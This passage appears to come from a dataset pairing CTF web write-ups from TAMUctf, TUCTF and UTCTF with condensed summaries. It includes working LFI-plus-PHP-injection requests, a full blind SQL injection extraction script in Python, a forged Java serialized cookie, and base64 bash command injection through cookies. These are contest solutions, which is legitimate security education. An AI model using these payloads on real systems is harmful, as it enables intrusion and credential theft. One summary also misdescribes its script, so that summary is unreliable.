		<link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"" integrity=""sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"" crossorigin=""anonymous"">
	</head>
	<body>
	Hello, <?php system('ls -al /'); ?><br><ul class=""list-group mx-2""><li class=""list-group-item my-1""><a href='?file=beemovie.txt'>beemovie.txt</a></li><li class=""list-group-item my-1""><a href='?file=hello.txt'>hello.txt</a></li><li class=""list-group-item my-1""><a href='?file=pi.txt'>pi.txt</a></li></ul>	</body>
</html>

GET /index.php?file=../../../../../../proc/self/fd/9 HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=11fcvj19chosurikvujm4639cq
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:29:42 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 1731
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"" integrity=""sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"" crossorigin=""anonymous"">
	</head>
	<body>
	<a class=""btn btn-primary"" href=""index.php"" role=""button"">🡄 Go back</a><br>name|s:28:""total 244
drwxr-xr-x    1 root     root          4096 Mar 20 01:55 .
drwxr-xr-x    1 root     root          4096 Mar 20 01:55 ..
-rwxr-xr-x    1 root     root             0 Mar 20 01:55 .dockerenv
drwxr-xr-x    2 root     root          4096 Jan 16 21:52 bin
drwxr-xr-x    5 root     root           340 Mar 20 01:55 dev
drwxr-xr-x    1 root     root          4096 Mar 20 01:55 etc
drwxr-xr-x    1 root     root          4096 Mar 20 01:23 flag_is_here
drwxr-xr-x    2 root     root          4096 Jan 16 21:52 home
drwxr-xr-x    1 root     root          4096 Mar 18 17:38 lib
drwxr-xr-x    5 root     root          4096 Jan 16 21:52 media
drwxr-xr-x    2 root     root          4096 Jan 16 21:52 mnt
drwxr-xr-x    2 root     root          4096 Jan 16 21:52 opt
dr-xr-xr-x  504 root     root             0 Mar 20 01:55 proc
drwx------    2 root     root          4096 Jan 16 21:52 root
drwxr-xr-x    1 root     root          4096 Mar 18 17:38 run
drwxr-xr-x    2 root     root          4096 Jan 16 21:52 sbin
drwxr-xr-x    2 root     root          4096 Jan 16 21:52 srv
-rw-rw-r--    1 root     root            36 Mar 18 17:37 start.sh
dr-xr-xr-x   13 root     root             0 Mar 20 01:16 sys
drwxrwxrwt    1 root     root        167936 Mar 20 02:29 tmp
drwxr-xr-x    1 root     root          4096 Jan 16 21:52 usr
drwxr-xr-x    1 root     root          4096 Mar 18 17:38 var
"";	</body>
</html>
```

So you can discover the `/flag_is_here` folder and enumerate it.

```
POST /index.php HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: http://filestorage.tamuctf.com
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=11fcvj19chosurikvujm4639cq
Upgrade-Insecure-Requests: 1

name=%3C%3Fphp%20system%28%27ls%20-al%20%2Fflag_is_here%27%29%3B%20%3F%3E

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:31:03 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 579
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"" integrity=""sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"" crossorigin=""anonymous"">
	</head>
	<body>
	Hello, <?php system('ls -al /flag_is_here'); ?><br><ul class=""list-group mx-2""><li class=""list-group-item my-1""><a href='?file=beemovie.txt'>beemovie.txt</a></li><li class=""list-group-item my-1""><a href='?file=hello.txt'>hello.txt</a></li><li class=""list-group-item my-1""><a href='?file=pi.txt'>pi.txt</a></li></ul>	</body>
</html>

GET /index.php?file=../../../../../../proc/self/fd/9 HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=11fcvj19chosurikvujm4639cq
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:31:07 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 549
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"" integrity=""sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"" crossorigin=""anonymous"">
	</head>
	<body>
	<a class=""btn btn-primary"" href=""index.php"" role=""button"">🡄 Go back</a><br>name|s:40:""total 12
drwxr-xr-x    1 root     root          4096 Mar 20 01:23 .
drwxr-xr-x    1 root     root          4096 Mar 20 01:55 ..
-rw-rw-r--    1 root     root            29 Mar 18 17:37 flag.txt
"";	</body>
</html>
```

And finally print `/flag_is_here/flag.txt` file.

```
POST /index.php HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
Origin: http://filestorage.tamuctf.com
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=11fcvj19chosurikvujm4639cq
Upgrade-Insecure-Requests: 1

name=%3C%3Fphp%20system%28%27cat%20%2Fflag_is_here%2Fflag.txt%27%29%20%3F%3E

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:33:17 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 584
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"" integrity=""sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"" crossorigin=""anonymous"">
	</head>
	<body>
	Hello, <?php system('cat /flag_is_here/flag.txt') ?><br><ul class=""list-group mx-2""><li class=""list-group-item my-1""><a href='?file=beemovie.txt'>beemovie.txt</a></li><li class=""list-group-item my-1""><a href='?file=hello.txt'>hello.txt</a></li><li class=""list-group-item my-1""><a href='?file=pi.txt'>pi.txt</a></li></ul>	</body>
</html>

GET /index.php?file=../../../../../../proc/self/fd/9 HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=11fcvj19chosurikvujm4639cq
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:33:48 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 384
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"" integrity=""sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"" crossorigin=""anonymous"">
	</head>
	<body>
	<a class=""btn btn-primary"" href=""index.php"" role=""button"">🡄 Go back</a><br>name|s:45:""gigem{535510n_f1l3_p0150n1n6}"";	</body>
</html>
```

So the flag is the following.

```
gigem{535510n_f1l3_p0150n1n6}
```","The website takes a `name` parameter and allows you to read some files. 

[HTTP POST request sent to the server containing form data with a single field named ""name"" and value ""foo"". The server responds with a 200 OK HTTP status code and a HTML page containing a greeting message and a list of three hyperlinks to text files.]

Analyzing the read files page, you can discover that the website is vulnerable to LFI.

You can abuse this vulnerability to analyze the `/proc/self/` directory in order to how the website stores the passed `name` parameter.

It seems that `name` is stored using PHP serialization and can be located into `/proc/self/fd/9` file. If you perform LFI to read a file including PHP code, it will be executed.

So you can pass a PHP command for the `name` value, like `<?php system('id'); ?>`.

And then use LFI to execute it.

You can now enumerate the root folder.

So you can discover the `/flag_is_here` folder and enumerate it.

And finally print `flag.txt` file."
"# TAMUctf 2020 – PASSWORD_EXTRACTION

* **Category:** web
* **Points:** 50

## Challenge

> The owner of this website often reuses passwords. Can you find out the password they are using on this test server?
> 
> http://passwordextraction.tamuctf.com
> 
> You do not need to use brute force for this challenge.

## Solution

The website contains only a login form that is vulnerable to SQL injection.

```
POST /login.php HTTP/1.1
Host: passwordextraction.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 75
Origin: http://passwordextraction.tamuctf.com
Connection: close
Referer: http://passwordextraction.tamuctf.com/
Upgrade-Insecure-Requests: 1

username=foo&password=foo%27%20OR%201%3D1%20AND%20username%20LIKE%20%27a%25

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Sat, 21 Mar 2020 18:00:47 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 72
Connection: close
Vary: Accept-Encoding

You've successfully authorized, but that doesn't get you the password.
```

Modifying the SQL injection query you will discover that the password is the flag.

```
POST /login.php HTTP/1.1
Host: passwordextraction.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 82
Origin: http://passwordextraction.tamuctf.com
Connection: close
Referer: http://passwordextraction.tamuctf.com/
Upgrade-Insecure-Requests: 1

username=foo&password=foo%27%20OR%201%3D1%20AND%20password%20LIKE%20%27gigem%7B%25

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Sat, 21 Mar 2020 18:02:51 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 72
Connection: close
Vary: Accept-Encoding

You've successfully authorized, but that doesn't get you the password.
```

You can write a [Python script](password-extraction-solver.py) to easily exfiltrate all password chars via blind SQL injection.

```python
import requests
import string
import time

url_form = ""http://passwordextraction.tamuctf.com/login.php""
payload = ""username=foo&password=foo' OR 1=1 AND password LIKE '{}%""
headers = {
   ""User-Agent"": ""Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);"", 
   ""Content-Type"": ""application/x-www-form-urlencoded"",
   ""Origin"": ""http://passwordextraction.tamuctf.com"",
   ""Referer"": ""http://passwordextraction.tamuctf.com/""
}

found_chars = ""gigem{""
while True:
    for new_char in string.printable.replace(""%"", """").replace(""_"", """"):
        attempt = found_chars + new_char
        print(""[*] Attempt: '{}'."".format(attempt))
        data = payload.format(attempt)
        print(""[*] Payload: {}."".format(data))
        
        page = None
        response_ok = False
        while not response_ok:
            try:
                page = requests.post(url_form, data=data, headers=headers)
                response_ok = True
            except:
                print(""[!] EXCEPTION!"")
                time.sleep(1 * 60)
    
        if ""successfully authorized"" in page.text:
            found_chars += new_char
            print(""[*] Found chars: '{}'"".format(found_chars))
            break
    
    if found_chars[-1] == ""}"":
        break
        
print(""The FLAG is: {}"".format(found_chars))
```

The flag is the following.

```
gigem{h0peYouScr1ptedTh1s}
```","The website contains only a login form that is vulnerable to SQL injection.

Modifying the SQL injection query you will discover that the password is the flag.

You can write a Python script to easily exfiltrate all password chars via blind SQL injection and print the flag."
"# TAMUctf 2020 – TOO_MANY_CREDITS_1

* **Category:** web
* **Points:** 50

## Challenge

> Okay, fine, there's a lot of credit systems. We had to put that guy on break; seriously concerned about that dude.
> 
> Anywho. We've made an actually secure one now, with Java, not dirty JS this time. Give it a whack?
> 
> If you get two thousand million credits again, well, we'll just have to shut this program down.
> 
> http://toomanycredits.tamuctf.com

## Solution

The website allows you to increment your credits, but you have to get two thousand million credits (or more) in order to get the flag. Obviously, the credit generation can't be bruteforced/automated, because automation countermeasures are in place.

Credits are incremented via HTTP GET.

```
GET / HTTP/1.1
Host: toomanycredits.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://toomanycredits.tamuctf.com/
Cookie: counter=""H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAIwCwY0JiUgAAAA==""
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 12:11:23 GMT
Content-Type: text/html;charset=UTF-8
Content-Length: 454
Connection: close
Set-Cookie: counter=""H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAEwAKMkv7UgAAAA==""; Version=1; HttpOnly
Content-Language: it-IT

<!DOCTYPE HTML>

<html lang=""en"">
<head>
    <meta charset=""utf-8"" />
    <meta name=""viewport"" content=""width=device-width, initial-scale=1, shrink-to-fit=no"" />

    <title>Java Credits</title>
</head>

<body>

<main role=""main"">

    <form>
        <h2>
            <span>You have 2 credits.</span>
            <span> You haven&#39;t won yet...</span>
        </h2>
        <button type=""submit"">Get More</button>
    </form>

</main>
</body>
</html>
```

There is a strange cookie, called `counter`, and it seems to be strangely encoded. Analyzing several requests, you can discover that only the last part changes.

```
H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAIwCwY0JiUgAAAA==
H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAEwAKMkv7UgAAAA==
H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAKwCppy9lUgAAAA==
H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAGwAT9ib8UgAAAA==
H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAOwCFxiGLUgAAAA==
............................................................................................^^^^^^^^........
```

The text says that they are using Java and the Spring logo is present in the favicon.

Furthermore, removing the last part of the cookie will spawn an interesting error.

```
GET / HTTP/1.1
Host: toomanycredits.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://toomanycredits.tamuctf.com/
Cookie: counter=""H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/""
Upgrade-Insecure-Requests: 1

HTTP/1.1 500 Internal Server Error
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 14:20:46 GMT
Content-Type: text/html;charset=UTF-8
Content-Length: 333
Connection: close
Content-Language: it-IT

<html><body><h1>Whitelabel Error Page</h1><p>This application has no explicit mapping for /error, so you are seeing this as a fallback.</p><div id='created'>Fri Mar 20 14:20:46 GMT 2020</div><div>There was an unexpected error (type=Internal Server Error, status=500).</div><div>Unexpected end of ZLIB input stream</div></body></html>
```

This seems to be a Java serialized object (compressed with GZip and encoded in Base64). So you can write a [Python script](too-many-credits-1-solver.py) to discover how the original object is formed.

```
H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAIwCwY0JiUgAAAA==
b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\x00\x00\x00\x01'

H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAEwAKMkv7UgAAAA==
b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\x00\x00\x00\x02'

H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAKwCppy9lUgAAAA==
b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\x00\x00\x00\x05'

H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAGwAT9ib8UgAAAA==
b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\x00\x00\x00\x06'

H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAOwCFxiGLUgAAAA==
b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\x00\x00\x00\x07'
```

The `value` attribute is at the end as we supposed, so a malicuous payload can easily crafted, e.g.:

```
b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\xff\xff\xff\xff'
```

Using the [Python script](too-many-credits-1-solver.py) you can craft the cookie.

```
[*] Malicious string is: b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\xff\xff\xff\xff'
[*] Compressed malicious bytes are: b'\x1f\x8b\x08\x00\x0c\xe6t^\x02\xff[\xf3\x96\x81\xb5\xb8\x88A79?W/\xb9(5%\xb3\xa4\x18\x83\xce\xcdOI\xcd\xd1s\x06\xf3\x9c\xf3K\xf3J\x8c8o\x0b\x89p\xaa\xb8310z1\xb0\x96%\xe6\x94\xa6V\x140\x00\xc1\x7f \x00\x00\xc5s\xfe\xcbR\x00\x00\x00'
[*] Base64 compressed malicious string is: H4sIAAzmdF4C/1vzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMADBfyAAAMVz/stSAAAA
```

A [Python script](too-many-credits-1-solver.py) can be developed to perform all the reported operations.

```python
import gzip
import base64

base64_compressed_strings = [
""H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAIwCwY0JiUgAAAA=="",
""H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAEwAKMkv7UgAAAA=="",
""H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAKwCppy9lUgAAAA=="",
""H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAGwAT9ib8UgAAAA=="",
""H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAOwCFxiGLUgAAAA==""
]

for base64_compressed_string in base64_compressed_strings:
    print(""[*] Base64 compressed string is: {}"".format(base64_compressed_string))

    compressed_bytes = base64.b64decode(base64_compressed_string)
    print(""[*] Compressed bytes are: {}"".format(compressed_bytes))

    original_string = gzip.decompress(compressed_bytes)
    print(""[*] Original bytes are: {}"".format(original_string))
    
    print()

print(""    -------\n"")

malicious_string = b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\xff\xff\xff\xff'
print(""[*] Malicious string is: {}"".format(malicious_string))

compressed_malicious_bytes = gzip.compress(malicious_string)
print(""[*] Compressed malicious bytes are: {}"".format(compressed_malicious_bytes))

base64_compressed_malicious_string = base64.b64encode(compressed_malicious_bytes).decode(""ascii"")

print(""[*] Base64 compressed malicious string is: {}"".format(base64_compressed_malicious_string))
```

And then performing the request you will get the flag.

```
GET / HTTP/1.1
Host: toomanycredits.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://toomanycredits.tamuctf.com/
Cookie: counter=""H4sIAAzmdF4C/1vzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMADBfyAAAMVz/stSAAAA""
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 15:49:46 GMT
Content-Type: text/html;charset=UTF-8
Content-Length: 470
Connection: close
Set-Cookie: counter=""H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMDAwMAIxAwCWeiUoUgAAAA==""; Version=1; HttpOnly
Content-Language: it-IT

<!DOCTYPE HTML>

<html lang=""en"">
<head>
    <meta charset=""utf-8"" />
    <meta name=""viewport"" content=""width=device-width, initial-scale=1, shrink-to-fit=no"" />

    <title>Java Credits</title>
</head>

<body>

<main role=""main"">

    <form>
        <h2>
            <span>You have 4294967296 credits.</span>
            <span> gigem{l0rdy_th15_1s_mAny_cr3d1ts}</span>
        </h2>
        <button type=""submit"">Get More</button>
    </form>

</main>
</body>
</html>
```

The flag is the following.

```
gigem{l0rdy_th15_1s_mAny_cr3d1ts}
```","The website allows you to increment your credits, but you have to get two thousand million credits (or more) in order to get the flag. Obviously, the credit generation can't be bruteforced/automated, because automation countermeasures are in place.

Credits are incremented via HTTP GET.

There is a strange cookie, called `counter`, and it seems to be strangely encoded. Analyzing several requests, you can discover that only the last part changes.

The text says that they are using Java and the Spring logo is present in the favicon.

Furthermore, removing the last part of the cookie will spawn an interesting error.

This seems to be a Java serialized object (compressed with GZip and encoded in Base64). So you can write a Python script to discover how the original object is formed.

The `value` attribute is at the end as we supposed, so a malicuous payload can easily crafted, e.g.:

Using the Python script you can craft the cookie.

A Python script can be developed to perform all the reported operations.

And then performing the request you will get the flag."
"# TUCTF 2017 – Cookie Duty

* **Category:** web
* **Points:** 50

## Challenge

> You have been summoned for Jury Duty. Try out the new web form with a state-of-the-art authentication system.
>
> [http://cookieduty.tuctf.com](http://cookieduty.tuctf.com)

## Solution

After submitting the form you can see a cookie:

```
not_admin : 1
```

It's sufficient to change that cookie to the value 0 and to refresh the page in order to retrieve the flag:

```
TUCTF{D0nt_Sk1p_C00k13_Duty}
```","After submitting the form you can see a cookie:

It's sufficient to change that cookie to the value 0 and to refresh the page in order to retrieve the flag."
"# TUCTF 2017 – Cookie Harrelson

* **Category:** web
* **Points:** 200

## Challenge

> Woody Harrelson has decided to take up web dev after learning about Cookies. Show him that he should go back to killing zombies.
>
> [http://cookieharrelson.tuctf.com](http://cookieharrelson.tuctf.com)

## Solution

Analyzing the cookies you can find the following:

```
tallahassee : Y2F0IGluZGV4LnR4dA%3D%3D
```

This cookie is base64 encoded:

```
Y2F0IGluZGV4LnR4dA==
```

Decoding it:

```
cat index.txt
```

Trying a command injection via the cookie will generate Base64 cookies in the following format:

```
cat index.txt #ls
```

So, trying to inject the Base64 version of this snippet:

```
!/bin/bash
ls .
```

Will enumerate the folder content, showing the presence of a ""flag"" file.
Trying to print the ""flag"" file with the following script (encoded via Base64 and passed into the cookie):

```
!/bin/bash
cat flag
```

Will show the flag:

```
TUCTF{D0nt_3x3cut3_Fr0m_C00k13s}
```","Analyzing the cookies you can find that it's base64 encoded.

Trying a command injection via the decoded cookie will generate Base64 cookies.

So, trying to inject the Base64 version of this snippet:

```
!/bin/bash
ls .
```

Will enumerate the folder content, showing the presence of a ""flag"" file.
Trying to print the ""flag"" file with the following script (encoded via Base64 and passed into the cookie):

[Bash script that lists the contents of the current directory.]"
"# TUCTF 2017 – High Source

* **Category:** web
* **Points:** 25

## Challenge

> This guy is getting wayyy too full of himself. He's called himself a master programmer, and he believes he has written a secure login function. Knock him off his high source.
>
> [http://highsource.tuctf.com/](http://highsource.tuctf.com/)

## Solution

The login is performed via a JavaScript script (i.e. `scripts/login.js)`.

Analyzing the code you can see the password that should be used to login:

```
I4m4M4st3rC0d3rH4x0rsB3w43
```

Using that password, you can find the flag:

```
TUCTF{H1gh_S0urc3_3qu4ls_L0ng_F4ll}
```","The login is performed via a JavaScript script.

Analyzing the code you can see the password that should be used to login.

Using that password, you can find the flag.
"
"# UTCTF 2020 – Chatt with Bratt

* **Category:** web
* **Points:** 50

## Challenge

> After announcing that he would be having an anonymous 1-on-1 AMA with randomly chosen, adoring fans, an engineering team hacked together a web app and likely forget to patch some obvious security holes. Anyway, you're one of the lucky fans chosen to chatt with Bratt Pid! Have fun: web3.utctf.live:8080
> 
> by phleisch

## Solution

The website simulates a chat with a VIP. Analyzing the HTML, some interesting JavaScript code can be found.

```html
	<script>
		function addMessage(content, name) {
			const messageBody = document.getElementById('message-body');
			const card = document.createElement(""div"");
			card.className = ""card"";
			const cardHeader = document.createElement(""div"");
			cardHeader.className = ""card-header"";
			const strongName = document.createElement(""strong"");
			strongName.innerHTML = name;
			cardHeader.appendChild(strongName);
			card.appendChild(cardHeader);
			const cardBody = document.createElement(""div"");
			cardBody.className = ""card-body"";
			const cardText = document.createElement(""p"");
			cardText.className = ""card-text"";
			cardText.innerHTML = content;
